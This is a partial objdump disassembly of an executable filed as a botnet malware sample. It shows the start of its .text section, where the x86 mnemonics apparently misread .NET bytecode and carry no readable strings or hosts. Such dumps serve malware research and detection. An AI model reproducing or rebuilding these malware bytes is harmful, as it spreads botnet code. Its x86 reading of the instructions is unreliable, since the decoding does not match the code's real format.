
malware_samples/botnet/fe57b1b7f4fa3b1f59eefcea180c45e1e1535b664107be15b40f0f1061f7f253.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	30 c7                	xor    %al,%bh
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 fc 59 00    	add    %al,0x59fc00
  402013:	00 00                	add    %al,(%eax)
  402015:	6d                   	insl   (%dx),%es:(%edi)
  402016:	00 00                	add    %al,(%eax)
  402018:	03 00                	add    (%eax),%eax
  40201a:	00 00                	add    %al,(%eax)
  40201c:	01 00                	add    %eax,(%eax)
  40201e:	00 06                	add    %al,(%esi)
	...
  402050:	bf eb 1e 56 fb       	mov    $0xfb561eeb,%edi
  402055:	cd 97                	int    $0x97
  402057:	3b b2 19 02 24 30    	cmp    0x30240219(%edx),%esi
  40205d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40205e:	78 43                	js     0x4020a3
  402060:	00 3d 56 44 d2 1e    	add    %bh,0x1ed24456
  402066:	62 b9 d4 f1 80 e7    	bound  %edi,-0x187f0e2c(%ecx)
  40206c:	e6 c3                	out    %al,$0xc3
  40206e:	39 41 2e             	cmp    %eax,0x2e(%ecx)
  402071:	00 2f                	add    %ch,(%edi)
  402073:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  402077:	00 1e                	add    %bl,(%esi)
  402079:	02 28                	add    (%eax),%ch
  40207b:	18 00                	sbb    %al,(%eax)
  40207d:	00 0a                	add    %cl,(%edx)
  40207f:	2a 1a                	sub    (%edx),%bl
  402081:	7e 13                	jle    0x402096
  402083:	00 00                	add    %al,(%eax)
  402085:	04 2a                	add    $0x2a,%al
  402087:	1e                   	push   %ds
  402088:	02 80 13 00 00 04    	add    0x4000013(%eax),%al
  40208e:	2a 1a                	sub    (%edx),%bl
  402090:	7e 14                	jle    0x4020a6
  402092:	00 00                	add    %al,(%eax)
  402094:	04 2a                	add    $0x2a,%al
  402096:	1e                   	push   %ds
  402097:	02 80 14 00 00 04    	add    0x4000014(%eax),%al
  40209d:	2a 1a                	sub    (%edx),%bl
  40209f:	7e 15                	jle    0x4020b6
  4020a1:	00 00                	add    %al,(%eax)
  4020a3:	04 2a                	add    $0x2a,%al
  4020a5:	1e                   	push   %ds
  4020a6:	02 80 15 00 00 04    	add    0x4000015(%eax),%al
  4020ac:	2a 1a                	sub    (%edx),%bl
  4020ae:	7e 16                	jle    0x4020c6
  4020b0:	00 00                	add    %al,(%eax)
  4020b2:	04 2a                	add    $0x2a,%al
  4020b4:	1e                   	push   %ds
  4020b5:	02 80 16 00 00 04    	add    0x4000016(%eax),%al
  4020bb:	2a 1a                	sub    (%edx),%bl
  4020bd:	7e 17                	jle    0x4020d6
  4020bf:	00 00                	add    %al,(%eax)
  4020c1:	04 2a                	add    $0x2a,%al
  4020c3:	1e                   	push   %ds
  4020c4:	02 80 17 00 00 04    	add    0x4000017(%eax),%al
  4020ca:	2a 1a                	sub    (%edx),%bl
  4020cc:	7e 18                	jle    0x4020e6
  4020ce:	00 00                	add    %al,(%eax)
  4020d0:	04 2a                	add    $0x2a,%al
  4020d2:	1e                   	push   %ds
  4020d3:	02 80 18 00 00 04    	add    0x4000018(%eax),%al
  4020d9:	2a 1a                	sub    (%edx),%bl
  4020db:	7e 19                	jle    0x4020f6
  4020dd:	00 00                	add    %al,(%eax)
  4020df:	04 2a                	add    $0x2a,%al
  4020e1:	1e                   	push   %ds
  4020e2:	02 80 19 00 00 04    	add    0x4000019(%eax),%al
  4020e8:	2a 1a                	sub    (%edx),%bl
  4020ea:	7e 1a                	jle    0x402106
  4020ec:	00 00                	add    %al,(%eax)
  4020ee:	04 2a                	add    $0x2a,%al
  4020f0:	1a 7e 1b             	sbb    0x1b(%esi),%bh
  4020f3:	00 00                	add    %al,(%eax)
  4020f5:	04 2a                	add    $0x2a,%al
  4020f7:	1e                   	push   %ds
  4020f8:	02 80 1b 00 00 04    	add    0x400001b(%eax),%al
  4020fe:	2a 1a                	sub    (%edx),%bl
  402100:	7e 1c                	jle    0x40211e
  402102:	00 00                	add    %al,(%eax)
  402104:	04 2a                	add    $0x2a,%al
  402106:	1e                   	push   %ds
  402107:	02 80 1c 00 00 04    	add    0x400001c(%eax),%al
  40210d:	2a 1a                	sub    (%edx),%bl
  40210f:	7e 1d                	jle    0x40212e
  402111:	00 00                	add    %al,(%eax)
  402113:	04 2a                	add    $0x2a,%al
  402115:	1e                   	push   %ds
  402116:	02 80 1d 00 00 04    	add    0x400001d(%eax),%al
  40211c:	2a 2a                	sub    (%edx),%ch
  40211e:	02 28                	add    (%eax),%ch
  402120:	3e 00 00             	add    %al,%ds:(%eax)
  402123:	0a 16                	or     (%esi),%dl
  402125:	fe 03                	incb   (%ebx)
  402127:	2a 32                	sub    (%edx),%dh
  402129:	7e 0b                	jle    0x402136
  40212b:	00 00                	add    %al,(%eax)
  40212d:	04 03                	add    $0x3,%al
  40212f:	6f                   	outsl  %ds:(%esi),(%dx)
  402130:	3f                   	aas
  402131:	00 00                	add    %al,(%eax)
  402133:	0a 2a                	or     (%edx),%ch
  402135:	2e 73 18             	jae,pn 0x402150
  402138:	00 00                	add    %al,(%eax)
  40213a:	0a 80 1a 00 00 04    	or     0x400001a(%eax),%al
  402140:	2a e6                	sub    %dh,%ah
  402142:	28 29                	sub    %ch,(%ecx)
  402144:	00 00                	add    %al,(%eax)
  402146:	06                   	push   %es
  402147:	3a 28                	cmp    (%eax),%ch
  402149:	00 00                	add    %al,(%eax)
  40214b:	00 28                	add    %ch,(%eax)
  40214d:	2a 00                	sub    (%eax),%al
  40214f:	00 06                	add    %al,(%esi)
  402151:	3a 1e                	cmp    (%esi),%bl
  402153:	00 00                	add    %al,(%eax)
  402155:	00 28                	add    %ch,(%eax)
  402157:	2b 00                	sub    (%eax),%eax
  402159:	00 06                	add    %al,(%esi)
  40215b:	3a 14 00             	cmp    (%eax,%eax,1),%dl
  40215e:	00 00                	add    %al,(%eax)
  402160:	28 27                	sub    %ah,(%edi)
  402162:	00 00                	add    %al,(%eax)
  402164:	06                   	push   %es
  402165:	3a 0a                	cmp    (%edx),%cl
  402167:	00 00                	add    %al,(%eax)
  402169:	00 28                	add    %ch,(%eax)
  40216b:	28 00                	sub    %al,(%eax)
  40216d:	00 06                	add    %al,(%esi)
  40216f:	39 06                	cmp    %eax,(%esi)
  402171:	00 00                	add    %al,(%eax)
  402173:	00 14 28             	add    %dl,(%eax,%ebp,1)
  402176:	76 00                	jbe    0x402178
  402178:	00 0a                	add    %cl,(%edx)
  40217a:	2a 56 28             	sub    0x28(%esi),%dl
  40217d:	9c                   	pushf
  40217e:	00 00                	add    %al,(%eax)
  402180:	0a 73 9d             	or     -0x63(%ebx),%dh
  402183:	00 00                	add    %al,(%eax)
  402185:	0a 20                	or     (%eax),%ah
  402187:	20 02                	and    %al,(%edx)
  402189:	00 00                	add    %al,(%eax)
  40218b:	6f                   	outsl  %ds:(%esi),(%dx)
  40218c:	9e                   	sahf
  40218d:	00 00                	add    %al,(%eax)
  40218f:	0a 2a                	or     (%edx),%ch
  402191:	6e                   	outsb  %ds:(%esi),(%dx)
  402192:	7e 1e                	jle    0x4021b2
  402194:	00 00                	add    %al,(%eax)
  402196:	04 39                	add    $0x39,%al
  402198:	10 00                	adc    %al,(%eax)
  40219a:	00 00                	add    %al,(%eax)
  40219c:	7e 1e                	jle    0x4021bc
  40219e:	00 00                	add    %al,(%eax)
  4021a0:	04 6f                	add    $0x6f,%al
  4021a2:	ad                   	lods   %ds:(%esi),%eax
  4021a3:	00 00                	add    %al,(%eax)
  4021a5:	0a 14 80             	or     (%eax,%eax,4),%dl
  4021a8:	1e                   	push   %ds
  4021a9:	00 00                	add    %al,(%eax)
  4021ab:	04 2a                	add    $0x2a,%al
  4021ad:	7e 7e                	jle    0x40222d
  4021af:	0f 00 00             	sldt   (%eax)
  4021b2:	04 28                	add    $0x28,%al
  4021b4:	17                   	pop    %ss
  4021b5:	00 00                	add    %al,(%eax)
  4021b7:	0a 39                	or     (%ecx),%bh
  4021b9:	0f 00 00             	sldt   (%eax)
  4021bc:	00 28                	add    %ch,(%eax)
  4021be:	30 00                	xor    %al,(%eax)
  4021c0:	00 06                	add    %al,(%esi)
  4021c2:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  4021c8:	40                   	inc    %eax
  4021c9:	00 00                	add    %al,(%eax)
  4021cb:	06                   	push   %es
  4021cc:	2a 56 72             	sub    0x72(%esi),%dl
  4021cf:	9a 25 00 70 7e 10 00 	lcall  $0x10,$0x7e700025
  4021d6:	00 04 28             	add    %al,(%eax,%ebp,1)
  4021d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4021da:	00 00                	add    %al,(%eax)
  4021dc:	0a 80 23 00 00 04    	or     0x4000023(%eax),%al
  4021e2:	2a be 73 94 00 00    	sub    0x9473(%esi),%bh
  4021e8:	06                   	push   %es
  4021e9:	25 72 4e 21 00       	and    $0x214e72,%eax
  4021ee:	70 6f                	jo     0x40225f
  4021f0:	7f 00                	jg     0x4021f2
  4021f2:	00 06                	add    %al,(%esi)
  4021f4:	72 46                	jb     0x40223c
  4021f6:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4021fa:	8c 00                	mov    %es,(%eax)
  4021fc:	00 06                	add    %al,(%esi)
  4021fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4021ff:	89 00                	mov    %eax,(%eax)
  402201:	00 06                	add    %al,(%esi)
  402203:	28 20                	sub    %ah,(%eax)
  402205:	00 00                	add    %al,(%eax)
  402207:	06                   	push   %es
  402208:	20 e8                	and    %ch,%al
  40220a:	03 00                	add    (%eax),%eax
  40220c:	00 28                	add    %ch,(%eax)
  40220e:	14 00                	adc    $0x0,%al
  402210:	00 0a                	add    %cl,(%edx)
  402212:	2a da                	sub    %dl,%bl
  402214:	73 94                	jae    0x4021aa
  402216:	00 00                	add    %al,(%eax)
  402218:	06                   	push   %es
  402219:	25 72 4e 21 00       	and    $0x214e72,%eax
  40221e:	70 6f                	jo     0x40228f
  402220:	7f 00                	jg     0x402222
  402222:	00 06                	add    %al,(%esi)
  402224:	72 58                	jb     0x40227e
  402226:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  40222a:	8c 00                	mov    %es,(%eax)
  40222c:	00 06                	add    %al,(%esi)
  40222e:	25 72 58 26 00       	and    $0x265872,%eax
  402233:	70 6f                	jo     0x4022a4
  402235:	7f 00                	jg     0x402237
  402237:	00 06                	add    %al,(%esi)
  402239:	02 6f 8c             	add    -0x74(%edi),%ch
  40223c:	00 00                	add    %al,(%eax)
  40223e:	06                   	push   %es
  40223f:	6f                   	outsl  %ds:(%esi),(%dx)
  402240:	89 00                	mov    %eax,(%eax)
  402242:	00 06                	add    %al,(%esi)
  402244:	28 20                	sub    %ah,(%eax)
  402246:	00 00                	add    %al,(%eax)
  402248:	06                   	push   %es
  402249:	2a 2e                	sub    (%esi),%ch
  40224b:	73 c9                	jae    0x402216
  40224d:	00 00                	add    %al,(%eax)
  40224f:	0a 80 24 00 00 04    	or     0x4000024(%eax),%al
  402255:	2a 5e 02             	sub    0x2(%esi),%bl
  402258:	28 19                	sub    %bl,(%ecx)
  40225a:	00 00                	add    %al,(%eax)
  40225c:	0a 03                	or     (%ebx),%al
  40225e:	6f                   	outsl  %ds:(%esi),(%dx)
  40225f:	1f                   	pop    %ds
  402260:	00 00                	add    %al,(%eax)
  402262:	0a 28                	or     (%eax),%ch
  402264:	4d                   	dec    %ebp
  402265:	00 00                	add    %al,(%eax)
  402267:	06                   	push   %es
  402268:	28 ce                	sub    %cl,%dh
  40226a:	00 00                	add    %al,(%eax)
  40226c:	0a 2a                	or     (%edx),%ch
  40226e:	5e                   	pop    %esi
  40226f:	28 19                	sub    %bl,(%ecx)
  402271:	00 00                	add    %al,(%eax)
  402273:	0a 02                	or     (%edx),%al
  402275:	03 28                	add    (%eax),%ebp
  402277:	1a 00                	sbb    (%eax),%al
  402279:	00 0a                	add    %cl,(%edx)
  40227b:	28 4f 00             	sub    %cl,0x0(%edi)
  40227e:	00 06                	add    %al,(%esi)
  402280:	6f                   	outsl  %ds:(%esi),(%dx)
  402281:	1b 00                	sbb    (%eax),%eax
  402283:	00 0a                	add    %cl,(%edx)
  402285:	2a 62 1f             	sub    0x1f(%edx),%ah
  402288:	20 8d 44 00 00 01    	and    %cl,0x1000044(%ebp)
  40228e:	25 d0 2d 00 00       	and    $0x2dd0,%eax
  402293:	04 28                	add    $0x28,%al
  402295:	e4 00                	in     $0x0,%al
  402297:	00 0a                	add    %cl,(%edx)
  402299:	80 2c 00 00          	subb   $0x0,(%eax,%eax,1)
  40229d:	04 2a                	add    $0x2a,%al
  40229f:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022a2:	00 00                	add    %al,(%eax)
  4022a4:	04 02                	add    $0x2,%al
  4022a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4022a7:	1f                   	pop    %ds
  4022a8:	00 00                	add    %al,(%eax)
  4022aa:	0a 2a                	or     (%edx),%ch
  4022ac:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022af:	00 00                	add    %al,(%eax)
  4022b1:	04 02                	add    $0x2,%al
  4022b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4022b4:	1b 00                	sbb    (%eax),%eax
  4022b6:	00 0a                	add    %cl,(%edx)
  4022b8:	2a 32                	sub    (%edx),%dh
  4022ba:	02 28                	add    (%eax),%ch
  4022bc:	e7 00                	out    %eax,$0x0
  4022be:	00 0a                	add    %cl,(%edx)
  4022c0:	28 58 00             	sub    %bl,0x0(%eax)
  4022c3:	00 06                	add    %al,(%esi)
  4022c5:	2a 8e 1a 8d 44 00    	sub    0x448d1a(%esi),%cl
  4022cb:	00 01                	add    %al,(%ecx)
  4022cd:	25 19 02 d2 9c       	and    $0x9cd20219,%eax
  4022d2:	25 18 02 1e 63       	and    $0x631e0218,%eax
  4022d7:	d2 9c 25 17 02 1f 10 	rcrb   %cl,0x101f0217(%ebp,%eiz,1)
  4022de:	63 d2                	arpl   %edx,%edx
  4022e0:	9c                   	pushf
  4022e1:	25 16 02 1f 18       	and    $0x181f0216,%eax
  4022e6:	63 d2                	arpl   %edx,%edx
  4022e8:	9c                   	pushf
  4022e9:	2a 4e 18             	sub    0x18(%esi),%cl
  4022ec:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4022f0:	01 25 17 02 d2 9c    	add    %esp,0x9cd20217
  4022f6:	25 16 02 1e 63       	and    $0x631e0216,%eax
  4022fb:	d2 9c 2a 32 02 28 e8 	rcrb   %cl,-0x17d7fdce(%edx,%ebp,1)
  402302:	00 00                	add    %al,(%eax)
  402304:	0a 28                	or     (%eax),%ch
  402306:	58                   	pop    %eax
  402307:	00 00                	add    %al,(%eax)
  402309:	06                   	push   %es
  40230a:	2a 2e                	sub    (%esi),%ch
  40230c:	73 e9                	jae    0x4022f7
  40230e:	00 00                	add    %al,(%eax)
  402310:	0a 80 2e 00 00 04    	or     0x400002e(%eax),%al
  402316:	2a 56 02             	sub    0x2(%esi),%dl
  402319:	15 7d 30 00 00       	adc    $0x307d,%eax
  40231e:	04 02                	add    $0x2,%al
  402320:	28 18                	sub    %bl,(%eax)
  402322:	00 00                	add    %al,(%eax)
  402324:	0a 02                	or     (%edx),%al
  402326:	03 7d 2f             	add    0x2f(%ebp),%edi
  402329:	00 00                	add    %al,(%eax)
  40232b:	04 2a                	add    $0x2a,%al
  40232d:	4a                   	dec    %edx
  40232e:	02 7b 2f             	add    0x2f(%ebx),%bh
  402331:	00 00                	add    %al,(%eax)
  402333:	04 02                	add    $0x2,%al
  402335:	7b 30                	jnp    0x402367
  402337:	00 00                	add    %al,(%eax)
  402339:	04 6f                	add    $0x6f,%al
  40233b:	ea 00 00 0a 2a 8a 02 	ljmp   $0x28a,$0x2a0a0000
  402342:	02 7b 30             	add    0x30(%ebx),%bh
  402345:	00 00                	add    %al,(%eax)
  402347:	04 17                	add    $0x17,%al
  402349:	58                   	pop    %eax
  40234a:	7d 30                	jge    0x40237c
  40234c:	00 00                	add    %al,(%eax)
  40234e:	04 02                	add    $0x2,%al
  402350:	7b 30                	jnp    0x402382
  402352:	00 00                	add    %al,(%eax)
  402354:	04 02                	add    $0x2,%al
  402356:	7b 2f                	jnp    0x402387
  402358:	00 00                	add    %al,(%eax)
  40235a:	04 6f                	add    $0x6f,%al
  40235c:	eb 00                	jmp    0x40235e
  40235e:	00 0a                	add    %cl,(%edx)
  402360:	fe 04 2a             	incb   (%edx,%ebp,1)
  402363:	22 02                	and    (%edx),%al
  402365:	15 7d 30 00 00       	adc    $0x307d,%eax
  40236a:	04 2a                	add    $0x2a,%al
  40236c:	56                   	push   %esi
  40236d:	02 28                	add    (%eax),%ch
  40236f:	18 00                	sbb    %al,(%eax)
  402371:	00 0a                	add    %cl,(%edx)
  402373:	02 03                	add    (%ebx),%al
  402375:	7d 32                	jge    0x4023a9
  402377:	00 00                	add    %al,(%eax)
  402379:	04 02                	add    $0x2,%al
  40237b:	04 7d                	add    $0x7d,%al
  40237d:	31 00                	xor    %eax,(%eax)
  40237f:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402382:	32 02                	xor    (%edx),%al
  402384:	7b 32                	jnp    0x4023b8
  402386:	00 00                	add    %al,(%eax)
  402388:	04 6f                	add    $0x6f,%al
  40238a:	71 00                	jno    0x40238c
  40238c:	00 06                	add    %al,(%esi)
  40238e:	2a 4e 02             	sub    0x2(%esi),%cl
  402391:	7b 32                	jnp    0x4023c5
  402393:	00 00                	add    %al,(%eax)
  402395:	04 6f                	add    $0x6f,%al
  402397:	71 00                	jno    0x402399
  402399:	00 06                	add    %al,(%esi)
  40239b:	25 03 6f 8c 00       	and    $0x8c6f03,%eax
  4023a0:	00 06                	add    %al,(%esi)
  4023a2:	2a 4e 02             	sub    0x2(%esi),%cl
  4023a5:	7b 32                	jnp    0x4023d9
  4023a7:	00 00                	add    %al,(%eax)
  4023a9:	04 6f                	add    $0x6f,%al
  4023ab:	71 00                	jno    0x4023ad
  4023ad:	00 06                	add    %al,(%esi)
  4023af:	25 03 6f 74 00       	and    $0x746f03,%eax
  4023b4:	00 06                	add    %al,(%esi)
  4023b6:	2a 4e 02             	sub    0x2(%esi),%cl
  4023b9:	7b 32                	jnp    0x4023ed
  4023bb:	00 00                	add    %al,(%eax)
  4023bd:	04 6f                	add    $0x6f,%al
  4023bf:	71 00                	jno    0x4023c1
  4023c1:	00 06                	add    %al,(%esi)
  4023c3:	25 03 6f 85 00       	and    $0x856f03,%eax
  4023c8:	00 06                	add    %al,(%esi)
  4023ca:	2a 36                	sub    (%esi),%dh
  4023cc:	02 7b 31             	add    0x31(%ebx),%bh
  4023cf:	00 00                	add    %al,(%eax)
  4023d1:	04 03                	add    $0x3,%al
  4023d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4023d4:	ea 00 00 0a 2a 32 02 	ljmp   $0x232,$0x2a0a0000
  4023db:	7b 31                	jnp    0x40240e
  4023dd:	00 00                	add    %al,(%eax)
  4023df:	04 6f                	add    $0x6f,%al
  4023e1:	eb 00                	jmp    0x4023e3
  4023e3:	00 0a                	add    %cl,(%edx)
  4023e5:	2a 66 02             	sub    0x2(%esi),%ah
  4023e8:	03 7d 33             	add    0x33(%ebp),%edi
  4023eb:	00 00                	add    %al,(%eax)
  4023ed:	04 02                	add    $0x2,%al
  4023ef:	02 7b 33             	add    0x33(%ebx),%bh
  4023f2:	00 00                	add    %al,(%eax)
  4023f4:	04 6f                	add    $0x6f,%al
  4023f6:	7d 00                	jge    0x4023f8
  4023f8:	00 0a                	add    %cl,(%edx)
  4023fa:	7d 34                	jge    0x402430
  4023fc:	00 00                	add    %al,(%eax)
  4023fe:	04 2a                	add    $0x2a,%al
  402400:	82 02 7b             	addb   $0x7b,(%edx)
  402403:	36 00 00             	add    %al,%ss:(%eax)
  402406:	04 18                	add    $0x18,%al
  402408:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40240e:	28 6b 00             	sub    %ch,0x0(%ebx)
  402411:	00 06                	add    %al,(%esi)
  402413:	02 18                	add    (%eax),%bl
  402415:	7d 36                	jge    0x40244d
  402417:	00 00                	add    %al,(%eax)
  402419:	04 02                	add    $0x2,%al
  40241b:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40241f:	06                   	push   %es
  402420:	2a 82 02 7b 36 00    	sub    0x367b02(%edx),%al
  402426:	00 04 19             	add    %al,(%ecx,%ebx,1)
  402429:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40242f:	28 6b 00             	sub    %ch,0x0(%ebx)
  402432:	00 06                	add    %al,(%esi)
  402434:	02 19                	add    (%ecx),%bl
  402436:	7d 36                	jge    0x40246e
  402438:	00 00                	add    %al,(%eax)
  40243a:	04 02                	add    $0x2,%al
  40243c:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  402440:	06                   	push   %es
  402441:	2a 1e                	sub    (%esi),%bl
  402443:	02 28                	add    (%eax),%ch
  402445:	70 00                	jo     0x402447
  402447:	00 06                	add    %al,(%esi)
  402449:	2a 52 02             	sub    0x2(%edx),%dl
  40244c:	03 8c 68 00 00 01 7d 	add    0x7d010000(%eax,%ebp,2),%ecx
  402453:	35 00 00 04 02       	xor    $0x2040000,%eax
  402458:	1b 7d 36             	sbb    0x36(%ebp),%edi
  40245b:	00 00                	add    %al,(%eax)
  40245d:	04 2a                	add    $0x2a,%al
  40245f:	52                   	push   %edx
  402460:	02 03                	add    (%ebx),%al
  402462:	8c 95 00 00 01 7d    	mov    %ss,0x7d010000(%ebp)
  402468:	35 00 00 04 02       	xor    $0x2040000,%eax
  40246d:	1c 7d                	sbb    $0x7d,%al
  40246f:	36 00 00             	add    %al,%ss:(%eax)
  402472:	04 2a                	add    $0x2a,%al
  402474:	42                   	inc    %edx
  402475:	02 03                	add    (%ebx),%al
  402477:	7d 35                	jge    0x4024ae
  402479:	00 00                	add    %al,(%eax)
  40247b:	04 02                	add    $0x2,%al
  40247d:	1f                   	pop    %ds
  40247e:	0b 7d 36             	or     0x36(%ebp),%edi
  402481:	00 00                	add    %al,(%eax)
  402483:	04 2a                	add    $0x2a,%al
  402485:	52                   	push   %edx
  402486:	02 28                	add    (%eax),%ch
  402488:	70 00                	jo     0x40248a
  40248a:	00 06                	add    %al,(%esi)
  40248c:	25 03 7d 33 00       	and    $0x337d03,%eax
  402491:	00 04 04             	add    %al,(%esp,%eax,1)
  402494:	6f                   	outsl  %ds:(%esi),(%dx)
  402495:	81 00 00 06 2a 56    	addl   $0x562a0600,(%eax)
  40249b:	02 28                	add    (%eax),%ch
  40249d:	70 00                	jo     0x40249f
  40249f:	00 06                	add    %al,(%esi)
  4024a1:	25 03 7d 33 00       	and    $0x337d03,%eax
  4024a6:	00 04 04             	add    %al,(%esp,%eax,1)
  4024a9:	6a 6f                	push   $0x6f
  4024ab:	74 00                	je     0x4024ad
  4024ad:	00 06                	add    %al,(%esi)
  4024af:	2a 56 02             	sub    0x2(%esi),%dl
  4024b2:	28 6b 00             	sub    %ch,0x0(%ebx)
  4024b5:	00 06                	add    %al,(%esi)
  4024b7:	02 14 7d 35 00 00 04 	add    0x4000035(,%edi,2),%dl
  4024be:	02 17                	add    (%edi),%dl
  4024c0:	7d 36                	jge    0x4024f8
  4024c2:	00 00                	add    %al,(%eax)
  4024c4:	04 2a                	add    $0x2a,%al
  4024c6:	3e 02 03             	add    %ds:(%ebx),%al
  4024c9:	7d 35                	jge    0x402500
  4024cb:	00 00                	add    %al,(%eax)
  4024cd:	04 02                	add    $0x2,%al
  4024cf:	1a 7d 36             	sbb    0x36(%ebp),%bh
  4024d2:	00 00                	add    %al,(%eax)
  4024d4:	04 2a                	add    $0x2a,%al
  4024d6:	76 02                	jbe    0x4024da
  4024d8:	7b 35                	jnp    0x40250f
  4024da:	00 00                	add    %al,(%eax)
  4024dc:	04 3a                	add    $0x3a,%al
  4024de:	06                   	push   %es
  4024df:	00 00                	add    %al,(%eax)
  4024e1:	00 72 48             	add    %dh,0x48(%edx)
  4024e4:	21 00                	and    %eax,(%eax)
  4024e6:	70 2a                	jo     0x402512
  4024e8:	02 7b 35             	add    0x35(%ebx),%bh
  4024eb:	00 00                	add    %al,(%eax)
  4024ed:	04 6f                	add    $0x6f,%al
  4024ef:	38 00                	cmp    %al,(%eax)
  4024f1:	00 0a                	add    %cl,(%edx)
  4024f3:	2a 52 02             	sub    0x2(%edx),%dl
  4024f6:	1d 7d 36 00 00       	sbb    $0x367d,%eax
  4024fb:	04 02                	add    $0x2,%al
  4024fd:	03 8c 6c 00 00 01 7d 	add    0x7d010000(%esp,%ebp,2),%ecx
  402504:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402509:	56                   	push   %esi
  40250a:	02 1f                	add    (%edi),%bl
  40250c:	09 7d 36             	or     %edi,0x36(%ebp)
  40250f:	00 00                	add    %al,(%eax)
  402511:	04 02                	add    $0x2,%al
  402513:	03 8c 97 00 00 01 7d 	add    0x7d010000(%edi,%edx,4),%ecx
  40251a:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  40251f:	52                   	push   %edx
  402520:	02 1e                	add    (%esi),%bl
  402522:	7d 36                	jge    0x40255a
  402524:	00 00                	add    %al,(%eax)
  402526:	04 02                	add    $0x2,%al
  402528:	03 8c 96 00 00 01 7d 	add    0x7d010000(%esi,%edx,4),%ecx
  40252f:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402534:	1e                   	push   %ds
  402535:	02 28                	add    (%eax),%ch
  402537:	82 00 00             	addb   $0x0,(%eax)
  40253a:	06                   	push   %es
  40253b:	2a 22                	sub    (%edx),%ah
  40253d:	02 03                	add    (%ebx),%al
  40253f:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  402545:	1e                   	push   %ds
  402546:	02 28                	add    (%eax),%ch
  402548:	77 00                	ja     0x40254a
  40254a:	00 06                	add    %al,(%esi)
  40254c:	2a 22                	sub    (%edx),%ah
  40254e:	02 03                	add    (%ebx),%al
  402550:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  402554:	06                   	push   %es
  402555:	2a 1e                	sub    (%esi),%bl
  402557:	02 28                	add    (%eax),%ch
  402559:	78 00                	js     0x40255b
  40255b:	00 06                	add    %al,(%esi)
  40255d:	2a 22                	sub    (%edx),%ah
  40255f:	02 03                	add    (%ebx),%al
  402561:	28 85 00 00 06 2a    	sub    %al,0x2a060000(%ebp)
  402567:	1e                   	push   %ds
  402568:	02 7b 36             	add    0x36(%ebx),%bh
  40256b:	00 00                	add    %al,(%eax)
  40256d:	04 2a                	add    $0x2a,%al
  40256f:	32 02                	xor    (%edx),%al
  402571:	7b 38                	jnp    0x4025ab
  402573:	00 00                	add    %al,(%eax)
  402575:	04 73                	add    $0x73,%al
  402577:	5f                   	pop    %edi
  402578:	00 00                	add    %al,(%eax)
  40257a:	06                   	push   %es
  40257b:	2a 4a 02             	sub    0x2(%edx),%cl
  40257e:	73 c9                	jae    0x402549
  402580:	00 00                	add    %al,(%eax)
  402582:	0a 7d 38             	or     0x38(%ebp),%bh
  402585:	00 00                	add    %al,(%eax)
  402587:	04 02                	add    $0x2,%al
  402589:	28 18                	sub    %bl,(%eax)
  40258b:	00 00                	add    %al,(%eax)
  40258d:	0a 2a                	or     (%edx),%ch
  40258f:	3a 02                	cmp    (%edx),%al
  402591:	6f                   	outsl  %ds:(%esi),(%dx)
  402592:	00 01                	add    %al,(%ecx)
  402594:	00 0a                	add    %cl,(%edx)
  402596:	d2 02                	rolb   %cl,(%edx)
  402598:	28 97 00 00 06 2a    	sub    %dl,0x2a060000(%edi)
  40259e:	32 02                	xor    (%edx),%al
  4025a0:	20 c0                	and    %al,%al
  4025a2:	00 00                	add    %al,(%eax)
  4025a4:	00 6f ee             	add    %ch,-0x12(%edi)
  4025a7:	00 00                	add    %al,(%eax)
  4025a9:	0a 2a                	or     (%edx),%ch
  4025ab:	6a 02                	push   $0x2
  4025ad:	20 cb                	and    %cl,%bl
  4025af:	00 00                	add    %al,(%eax)
  4025b1:	00 6f ee             	add    %ch,-0x12(%edi)
  4025b4:	00 00                	add    %al,(%eax)
  4025b6:	0a 02                	or     (%edx),%al
  4025b8:	03 28                	add    (%eax),%ebp
  4025ba:	5c                   	pop    %esp
  4025bb:	00 00                	add    %al,(%eax)
  4025bd:	06                   	push   %es
  4025be:	16                   	push   %ss
  4025bf:	1e                   	push   %ds
  4025c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4025c1:	4c                   	dec    %esp
  4025c2:	00 00                	add    %al,(%eax)
  4025c4:	0a 2a                	or     (%edx),%ch
  4025c6:	7e 02                	jle    0x4025ca
  4025c8:	20 ca                	and    %cl,%dl
  4025ca:	00 00                	add    %al,(%eax)
  4025cc:	00 6f ee             	add    %ch,-0x12(%edi)
  4025cf:	00 00                	add    %al,(%eax)
  4025d1:	0a 02                	or     (%edx),%al
  4025d3:	03 28                	add    (%eax),%ebp
  4025d5:	fd                   	std
  4025d6:	00 00                	add    %al,(%eax)
  4025d8:	0a 28                	or     (%eax),%ch
  4025da:	58                   	pop    %eax
  4025db:	00 00                	add    %al,(%eax)
  4025dd:	06                   	push   %es
  4025de:	16                   	push   %ss
  4025df:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  4025e2:	00 00                	add    %al,(%eax)
  4025e4:	0a 2a                	or     (%edx),%ch
  4025e6:	7a 03                	jp     0x4025eb
